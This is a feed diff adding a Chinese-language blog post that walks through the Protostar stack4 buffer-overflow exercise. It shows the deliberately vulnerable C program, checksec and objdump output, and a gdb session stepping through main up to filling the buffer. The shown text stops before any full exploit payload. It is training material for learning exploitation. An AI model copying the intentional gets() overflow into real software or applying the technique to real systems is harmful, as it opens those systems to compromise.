@@ -4,9 +4,694 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Tue, 07 Nov 2023 12:56:33 GMT</lastBuildDate>
+        <lastBuildDate>Sun, 26 Nov 2023 08:29:15 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
+        <item>
+            <title><![CDATA[Protostar_stack4]]></title>
+            <guid>4d43dafae4d64e9f858c58ae53d9a421</guid>
+            <pubDate>Wed, 22 Nov 2023 02:31:02 GMT</pubDate>
+            <content:encoded><![CDATA[<p><strong>运行该程序，得到：</strong></p>
+<p><strong><img src="/_resources/fe16563cd4ed4ffc8de9b960099f3586.png" alt="ccb9efc32f7aa26df31421d720649538.png" width="554" height="89" class="jop-noMdConv" /></strong></p>
+<h3 id="source-code"><strong>Source code:</strong></h3>
+<div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span>
+{
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"code flow successfully changed\n"</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>
+{
+  <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];
+
+  gets(buffer);
+}</code></pre></div>
+<p><strong>checksec:</strong></p>
+<div><pre class="hljs"><code>┌──(kali㉿kali)-[/opt/protostar/bin]
+└─$ checksec --file=./stack4 
+[*] <span class="hljs-string">'/opt/protostar/bin/stack4'</span>
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments</code></pre></div>
+<p><strong>objdump:</strong></p>
+<div><pre class="hljs"><code>┌──(kali㉿kali)-[/opt/protostar/bin]
+└─$ objdump -t -j .text ./stack4 
+
+./stack4:     file format elf32-i386
+
+SYMBOL TABLE:
+08048340 l    d  .text  00000000              .text
+08048370 l     F .text  00000000              __do_global_dtors_aux
+080483d0 l     F .text  00000000              frame_dummy
+08048490 l     F .text  00000000              __do_global_ctors_aux
+08048420 g     F .text  00000005              __libc_csu_fini
+08048340 g     F .text  00000000              _start
+080483f4 g     F .text  00000014              win
+08048430 g     F .text  0000005a              __libc_csu_init
+0804848a g     F .text  00000000              .hidden __i686.get_pc_thunk.bx
+08048408 g     F .text  00000017              main</code></pre></div>
+<p><strong>查看汇编代码:</strong></p>
+<div><pre class="hljs"><code><span class="hljs-meta">gdb-peda$ </span><span class="language-bash">disass main</span>
+Dump of assembler code for function main:
+   0x08048408 &lt;+0&gt;:     push   ebp
+   0x08048409 &lt;+1&gt;:     mov    ebp,esp
+   0x0804840b &lt;+3&gt;:     and    esp,0xfffffff0
+   0x0804840e &lt;+6&gt;:     sub    esp,0x50
+   0x08048411 &lt;+9&gt;:     lea    eax,[esp+0x10]
+   0x08048415 &lt;+13&gt;:    mov    DWORD PTR [esp],eax
+   0x08048418 &lt;+16&gt;:    call   0x804830c &lt;gets@plt&gt;
+   0x0804841d &lt;+21&gt;:    leave
+   0x0804841e &lt;+22&gt;:    ret
+End of assembler dump.
+<span class="hljs-meta">gdb-peda$ </span><span class="language-bash">disass win</span>
+Dump of assembler code for function win:
+   0x080483f4 &lt;+0&gt;:     push   ebp
+   0x080483f5 &lt;+1&gt;:     mov    ebp,esp
+   0x080483f7 &lt;+3&gt;:     sub    esp,0x18
+   0x080483fa &lt;+6&gt;:     mov    DWORD PTR [esp],0x80484e0
+   0x08048401 &lt;+13&gt;:    call   0x804832c &lt;puts@plt&gt;
+   0x08048406 &lt;+18&gt;:    leave
+   0x08048407 &lt;+19&gt;:    ret
+End of assembler dump.</code></pre></div>
+<p><strong>调试过程如下：</strong></p>
+<div><pre class="hljs"><code>(gdb) i b
+Num     Type           Disp Enb Address    What
+1       breakpoint     keep y   0x08048408 in main at stack4/stack4.c:12
+2       breakpoint     keep y   0x08048409 in main at stack4/stack4.c:12
+3       breakpoint     keep y   0x0804840b in main at stack4/stack4.c:12
+4       breakpoint     keep y   0x0804840e in main at stack4/stack4.c:12
+5       breakpoint     keep y   0x08048411 in main at stack4/stack4.c:15
+6       breakpoint     keep y   0x08048415 in main at stack4/stack4.c:15
+7       breakpoint     keep y   0x08048418 in main at stack4/stack4.c:15
+8       breakpoint     keep y   0x0804841d in main at stack4/stack4.c:16
+9       breakpoint     keep y   0x0804841e in main at stack4/stack4.c:16</code></pre></div>
+<p><code>0x8048408 &lt;main&gt;: push ebp：</code></p>
+<p><strong>1、将当前函数的基址指针（ebp）的值压入栈中，保存当前函数的栈帧</strong></p>
+<div><pre class="hljs"><code>(gdb) r
+Starting program: /opt/protostar/bin/stack4 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library <span class="hljs-string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span>.
+
+Breakpoint 1, main (argc=&lt;error reading variable: Unknown argument list address <span class="hljs-keyword">for</span> `argc<span class="hljs-string">'.&gt;, 
+    argv=&lt;error reading variable: Unknown argument list address for `argv'</span>.&gt;) at stack4/stack4.c:12
+12      stack4/stack4.c: No such file or directory.
+(gdb) i r
+eax            0x8048408           134513672
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfac          0xffffcfac
+ebp            0x0                 0x0
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x8048408           0x8048408 &lt;main&gt;
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x8048408 &lt;main&gt;:    push   ebp
+   0x8048409 &lt;main+1&gt;:  mov    ebp,esp
+   0x804840b &lt;main+3&gt;:  and    esp,0xfffffff0
+   0x804840e &lt;main+6&gt;:  sub    esp,0x50
+   0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]
+   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax
+   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+(gdb) x/20wx <span class="hljs-variable">$esp</span>
+0xffffcfac:     0xf7c237c5      0x00000001      0xffffd064      0xffffd06c
+0xffffcfbc:     0xffffcfd0      0xf7e1dff4      0x08048408      0x00000001
+0xffffcfcc:     0xffffd064      0xf7e1dff4      0x08048430      0xf7ffcba0
+0xffffcfdc:     0x00000000      0xf25e5086      0x89ae3a96      0x00000000
+0xffffcfec:     0x00000000      0x00000000      0xf7ffcba0      0x00000000</code></pre></div>
+<p>执行<code>push ebp</code>后，而<code>esp 0xffffcfac -&gt; 0xffffcfa8</code></p>
+<p>2、<code>mov ebp,esp：</code><strong>将当前栈指针的值赋给基址指针，建立当前函数的栈帧。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 2, 0x08048409 <span class="hljs-keyword">in</span> main (argc=&lt;error reading variable: Unknown argument list address <span class="hljs-keyword">for</span> `argc<span class="hljs-string">'.&gt;, 
+    argv=&lt;error reading variable: Unknown argument list address for `argv'</span>.&gt;) at stack4/stack4.c:12
+12      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0x8048408           134513672
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfa8          0xffffcfa8
+ebp            0x0                 0x0
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x8048409           0x8048409 &lt;main+1&gt;
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x8048409 &lt;main+1&gt;:  mov    ebp,esp
+   0x804840b &lt;main+3&gt;:  and    esp,0xfffffff0
+   0x804840e &lt;main+6&gt;:  sub    esp,0x50
+   0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]
+   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax
+   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+(gdb) x/20wx <span class="hljs-variable">$esp</span>
+0xffffcfa8:     0x00000000      0xf7c237c5      0x00000001      0xffffd064
+0xffffcfb8:     0xffffd06c      0xffffcfd0      0xf7e1dff4      0x08048408
+0xffffcfc8:     0x00000001      0xffffd064      0xf7e1dff4      0x08048430
+0xffffcfd8:     0xf7ffcba0      0x00000000      0xf25e5086      0x89ae3a96
+0xffffcfe8:     0x00000000      0x00000000      0x00000000      0xf7ffcba0</code></pre></div>
+<p> 执行<code>mov ebp,esp</code>后，而<code>ebp = esp = 0xffffcfa8</code></p>
+<p>3、<code>and esp,0xfffffff0：</code><strong>将栈指针与0xfffffff0进行按位与操作，将栈指针向下舍入到16字节边界，以对齐栈。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 3, 0x0804840b <span class="hljs-keyword">in</span> main (argc=1, argv=0xffffd064) at stack4/stack4.c:12
+12      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0x8048408           134513672
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfa8          0xffffcfa8
+ebp            0xffffcfa8          0xffffcfa8
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x804840b           0x804840b &lt;main+3&gt;
+eflags         0x246               [ PF ZF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x804840b &lt;main+3&gt;:  and    esp,0xfffffff0
+   0x804840e &lt;main+6&gt;:  sub    esp,0x50
+   0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]
+   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax
+   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+(gdb) x/20wx <span class="hljs-variable">$esp</span>
+0xffffcfa8:     0x00000000      0xf7c237c5      0x00000001      0xffffd064
+0xffffcfb8:     0xffffd06c      0xffffcfd0      0xf7e1dff4      0x08048408
+0xffffcfc8:     0x00000001      0xffffd064      0xf7e1dff4      0x08048430
+0xffffcfd8:     0xf7ffcba0      0x00000000      0xf25e5086      0x89ae3a96
+0xffffcfe8:     0x00000000      0x00000000      0x00000000      0xf7ffcba0</code></pre></div>
+<p> 执行<code>and esp,0xfffffff0</code>后，<code>esp 0xffffcfa8 - &gt; 0xffffcfa0</code>，可以看到<code>0xffffcfa0: 0x00000000 0x00000078 0x00000000 0xf7c237c5</code>这一行，esp被对齐</p>
+<p>4、<code>sub esp,0x50：</code><strong>分配80字节的局部变量空间，通过将栈指针向下移动来实现。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 4, 0x0804840e <span class="hljs-keyword">in</span> main (argc=1, argv=0xffffd064) at stack4/stack4.c:12
+12      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0x8048408           134513672
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcfa0          0xffffcfa0
+ebp            0xffffcfa8          0xffffcfa8
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x804840e           0x804840e &lt;main+6&gt;
+eflags         0x286               [ PF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x804840e &lt;main+6&gt;:  sub    esp,0x50
+   0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]
+   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax
+   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp
+(gdb) x/20wx <span class="hljs-variable">$esp</span>
+0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5
+0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0
+0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
+0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
+0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000</code></pre></div>
+<p> 执行<code>sub esp,0x50</code>后，<code>esp 0xffffcfa0 - &gt; 0xffffcf50</code></p>
+<p>5、<code>lea eax,[esp+0x10]：</code><strong>计算并将<code>esp+0x10</code>的地址存储在eax寄存器中。此处可能在准备调用<code>gets</code>函数之前，为输入缓冲区分配空间。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 5, main (argc=1, argv=0xffffd064) at stack4/stack4.c:15
+15      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0x8048408           134513672
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcf50          0xffffcf50
+ebp            0xffffcfa8          0xffffcfa8
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x8048411           0x8048411 &lt;main+9&gt;
+eflags         0x286               [ PF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x8048411 &lt;main+9&gt;:  lea    eax,[esp+0x10]
+   0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax
+   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp
+   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret
+(gdb) x/20wx <span class="hljs-variable">$esp</span>
+0xffffcf50:     0xf7ffcff4      0x0000000c      0x00000000      0xffffdfde
+0xffffcf60:     0xf7fc8580      0x00000000      0xf7c1c9a2      0xf7e1e04c
+0xffffcf70:     0xf7fc2400      0xf7fd9e8b      0xf7c1c9a2      0xf7fc2400
+0xffffcf80:     0xffffcfc0      0xf7fc25d8      0xf7fc2aa0      0x00000001
+0xffffcf90:     0x00000001      0x00000000      0x00000000      0x00000000</code></pre></div>
+<p> 6、<code>mov DWORD PTR [esp],eax:</code><strong>将eax寄存器中的值存储到栈的顶部，这是作为参数传递给<code>gets</code>函数的地址。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 6, 0x08048415 <span class="hljs-keyword">in</span> main (argc=1, argv=0xffffd064) at stack4/stack4.c:15
+15      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0xffffcf60          -12448
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcf50          0xffffcf50
+ebp            0xffffcfa8          0xffffcfa8
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x8048415           0x8048415 &lt;main+13&gt;
+eflags         0x286               [ PF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x8048415 &lt;main+13&gt;: mov    DWORD PTR [esp],eax
+   0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp
+   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret
+   0x8048425:   lea    esi,[esi+eiz*1+0x0]
+(gdb) x/64wx <span class="hljs-variable">$esp</span>
+0xffffcf50:     0xf7ffcff4      0x0000000c      0x00000000      0xffffdfde
+0xffffcf60:     0xf7fc8580      0x00000000      0xf7c1c9a2      0xf7e1e04c
+0xffffcf70:     0xf7fc2400      0xf7fd9e8b      0xf7c1c9a2      0xf7fc2400
+0xffffcf80:     0xffffcfc0      0xf7fc25d8      0xf7fc2aa0      0x00000001
+0xffffcf90:     0x00000001      0x00000000      0x00000000      0x00000000
+0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5
+0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0
+0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
+0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
+0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000
+0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00
+0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888
+0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340
+0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4
+0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361
+0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430</code></pre></div>
+<p>7、<code>call 0x804830c gets@plt:</code><strong>调用<code>gets</code>函数，它从标准输入中读取字符串并将其存储在之前分配的地址中。然而，<code>gets</code>函数是一个不安全的函数，容易受到缓冲区溢出攻击。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+
+Breakpoint 7, 0x08048418 <span class="hljs-keyword">in</span> main (argc=1, argv=0xffffd064) at stack4/stack4.c:15
+15      <span class="hljs-keyword">in</span> stack4/stack4.c
+(gdb) i r
+eax            0xffffcf60          -12448
+ecx            0x89ae3a96          -1985070442
+edx            0xffffcfd0          -12336
+ebx            0xf7e1dff4          -136192012
+esp            0xffffcf50          0xffffcf50
+ebp            0xffffcfa8          0xffffcfa8
+esi            0x8048430           134513712
+edi            0xf7ffcba0          -134231136
+eip            0x8048418           0x8048418 &lt;main+16&gt;
+eflags         0x286               [ PF SF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/10i <span class="hljs-variable">$eip</span>
+=&gt; 0x8048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;
+   0x804841d &lt;main+21&gt;: leave
+   0x804841e &lt;main+22&gt;: ret
+   0x804841f:   nop
+   0x8048420 &lt;__libc_csu_fini&gt;: push   ebp
+   0x8048421 &lt;__libc_csu_fini+1&gt;:       mov    ebp,esp
+   0x8048423 &lt;__libc_csu_fini+3&gt;:       pop    ebp
+   0x8048424 &lt;__libc_csu_fini+4&gt;:       ret
+   0x8048425:   lea    esi,[esi+eiz*1+0x0]
+   0x8048429:   lea    edi,[edi+eiz*1+0x0]
+(gdb) x/64wx <span class="hljs-variable">$esp</span>
+0xffffcf50:     0xffffcf60      0x0000000c      0x00000000      0xffffdfde
+0xffffcf60:     0xf7fc8580      0x00000000      0xf7c1c9a2      0xf7e1e04c
+0xffffcf70:     0xf7fc2400      0xf7fd9e8b      0xf7c1c9a2      0xf7fc2400
+0xffffcf80:     0xffffcfc0      0xf7fc25d8      0xf7fc2aa0      0x00000001
+0xffffcf90:     0x00000001      0x00000000      0x00000000      0x00000000
+0xffffcfa0:     0x00000000      0x00000078      0x00000000      0xf7c237c5
+0xffffcfb0:     0x00000001      0xffffd064      0xffffd06c      0xffffcfd0
+0xffffcfc0:     0xf7e1dff4      0x08048408      0x00000001      0xffffd064
+0xffffcfd0:     0xf7e1dff4      0x08048430      0xf7ffcba0      0x00000000
+0xffffcfe0:     0xf25e5086      0x89ae3a96      0x00000000      0x00000000
+0xffffcff0:     0x00000000      0xf7ffcba0      0x00000000      0x1d1faa00
+0xffffd000:     0xf7ffda20      0xf7c23756      0xf7e1dff4      0xf7c23888
+0xffffd010:     0xf7fcaac4      0xf7ffcff4      0x00000001      0x08048340
+0xffffd020:     0x00000000      0xf7fdbe90      0xf7c23809      0xf7ffcff4
+0xffffd030:     0x00000001      0x08048340      0x00000000      0x08048361
+0xffffd040:     0x08048408      0x00000001      0xffffd064      0x08048430</code></pre></div>
+<p>8、<code>leave:</code><strong>恢复栈帧，相当于<code>mov esp, ebp</code> 和 <code>pop ebp</code> 的组合，释放栈空间。</strong></p>
+<div><pre class="hljs"><code>(gdb) n
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa    
+
+Breakpoint <span class="hljs-number">8</span>, main (argc=<span class="hljs-number">1</span>, argv=<span class="hljs-number">0xffffd064</span>) <span class="hljs-meta">at</span> stack4/stack4<span class="hljs-number">.</span>c:<span class="hljs-number">16</span>
+<span class="hljs-number">16</span>      <span class="hljs-keyword">in</span> stack4/stack4<span class="hljs-number">.</span>c
+(gdb) i r
+<span class="hljs-built_in">eax</span>            <span class="hljs-number">0xffffcf60</span>          -<span class="hljs-number">12448</span>
+<span class="hljs-built_in">ecx</span>            <span class="hljs-number">0xf7e1f9c4</span>          -<span class="hljs-number">136185404</span>
+<span class="hljs-built_in">edx</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0</span>
+<span class="hljs-built_in">ebx</span>            <span class="hljs-number">0xf7e1dff4</span>          -<span class="hljs-number">136192012</span>
+<span class="hljs-built_in">esp</span>            <span class="hljs-number">0xffffcf50</span>          <span class="hljs-number">0xffffcf50</span>
+<span class="hljs-built_in">ebp</span>            <span class="hljs-number">0xffffcfa8</span>          <span class="hljs-number">0xffffcfa8</span>
+<span class="hljs-built_in">esi</span>            <span class="hljs-number">0x8048430</span>           <span class="hljs-number">134513712</span>
+<span class="hljs-built_in">edi</span>            <span class="hljs-number">0xf7ffcba0</span>          -<span class="hljs-number">134231136</span>
+<span class="hljs-built_in">eip</span>            <span class="hljs-number">0x804841d</span>           <span class="hljs-number">0x804841d</span> &lt;main+<span class="hljs-number">21</span>&gt;
+eflags         <span class="hljs-number">0x246</span>               [ PF ZF IF ]
+<span class="hljs-built_in">cs</span>             <span class="hljs-number">0x23</span>                <span class="hljs-number">35</span>
+<span class="hljs-built_in">ss</span>             <span class="hljs-number">0x2b</span>                <span class="hljs-number">43</span>
+<span class="hljs-built_in">ds</span>             <span class="hljs-number">0x2b</span>                <span class="hljs-number">43</span>
+<span class="hljs-built_in">es</span>             <span class="hljs-number">0x2b</span>                <span class="hljs-number">43</span>
+<span class="hljs-built_in">fs</span>             <span class="hljs-number">0x0</span>                 <span class="hljs-number">0</span>
+<span class="hljs-built_in">gs</span>             <span class="hljs-number">0x63</span>                <span class="hljs-number">99</span>
+(gdb) x/10i $<span class="hljs-built_in">eip</span>
+=&gt; <span class="hljs-number">0x804841d</span> &lt;main+<span class="hljs-number">21</span>&gt;: <span class="hljs-keyword">leave</span>
+   <span class="hljs-number">0x804841e</span> &lt;main+<span class="hljs-number">22</span>&gt;: <span class="hljs-keyword">ret</span>
+   <span class="hljs-number">0x804841f</span>:   <span class="hljs-keyword">nop</span>
+   <span class="hljs-number">0x8048420</span> &lt;__libc_csu_fini&gt;: <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ebp</span>
+   <span class="hljs-number">0x8048421</span> &lt;__libc_csu_fini+<span class="hljs-number">1</span>&gt;:       <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">esp</span>
+   <span class="hljs-number">0x8048423</span> &lt;__libc_csu_fini+<span class="hljs-number">3</span>&gt;:       <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">ebp</span>
+   <span class="hljs-number">0x8048424</span> &lt;__libc_csu_fini+<span class="hljs-number">4</span>&gt;:       <span class="hljs-keyword">ret</span>
+   <span class="hljs-number">0x8048425</span>:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">esi</span>,[<span class="hljs-built_in">esi</span>+eiz*<span class="hljs-number">1</span>+<span class="hljs-number">0x0</span>]
+   <span class="hljs-number">0x8048429</span>:   <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">edi</span>,[<span class="hljs-built_in">edi</span>+eiz*<span class="hljs-number">1</span>+<span class="hljs-number">0x0</span>]
+   <span class="hljs-number">0x8048430</span> &lt;__libc_csu_init&gt;: <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ebp</span>
+(gdb) x/64wx $<span class="hljs-built_in">esp</span>
+<span class="hljs-number">0xffffcf50</span>:     <span class="hljs-number">0xffffcf60</span>      <span class="hljs-number">0x0000000c</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xffffdfde</span>
+<span class="hljs-number">0xffffcf60</span>:     <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>
+<span class="hljs-number">0xffffcf70</span>:     <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>
+<span class="hljs-number">0xffffcf80</span>:     <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>
+<span class="hljs-number">0xffffcf90</span>:     <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>      <span class="hljs-number">0x61616161</span>
+<span class="hljs-number">0xffffcfa0</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000078</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7c237c5</span>
+<span class="hljs-number">0xffffcfb0</span>:     <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0xffffd064</span>      <span class="hljs-number">0xffffd06c</span>      <span class="hljs-number">0xffffcfd0</span>
+<span class="hljs-number">0xffffcfc0</span>:     <span class="hljs-number">0xf7e1dff4</span>      <span class="hljs-number">0x08048408</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0xffffd064</span>
+<span class="hljs-number">0xffffcfd0</span>:     <span class="hljs-number">0xf7e1dff4</span>      <span class="hljs-number">0x08048430</span>      <span class="hljs-number">0xf7ffcba0</span>      <span class="hljs-number">0x00000000</span>
+<span class="hljs-number">0xffffcfe0</span>:     <span class="hljs-number">0xf25e5086</span>      <span class="hljs-number">0x89ae3a96</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>
+<span class="hljs-number">0xffffcff0</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7ffcba0</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x1d1faa00</span>
+<span class="hljs-number">0xffffd000</span>:     <span class="hljs-number">0xf7ffda20</span>      <span class="hljs-number">0xf7c23756</span>      <span class="hljs-number">0xf7e1dff4</span>      <span class="hljs-number">0xf7c23888</span>
+<span class="hljs-number">0xffffd010</span>:     <span class="hljs-number">0xf7fcaac4</span>      <span class="hljs-number">0xf7ffcff4</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x08048340</span>
+<span class="hljs-number">0xffffd020</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7fdbe90</span>      <span class="hljs-number">0xf7c23809</span>      <span class="hljs-number">0xf7ffcff4</span>
+<span class="hljs-number">0xffffd030</span>:     <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x08048340</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x08048361</span>
+<span class="hljs-number">0xffffd040</span>:     <span class="hljs-number">0x08048408</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0xffffd064</span>      <span class="hljs-number">0x08048430</span></code></pre></div>
